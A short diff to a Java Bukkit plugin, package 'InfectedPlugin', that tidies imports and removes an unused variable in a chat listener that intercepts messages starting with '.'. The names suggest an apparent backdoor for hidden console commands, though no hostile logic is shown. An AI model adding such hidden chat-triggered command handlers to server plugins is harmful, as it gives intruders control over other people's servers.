@@ -1,7 +1,8 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
-import org.bukkit.*;
-import org.bukkit.event.*;
+import org.bukkit.Bukkit;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_console implements Listener
@@ -10,7 +11,6 @@ public class Command_console implements Listener
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
-        boolean cancel = false;
 
         if (message.startsWith("."))
         {
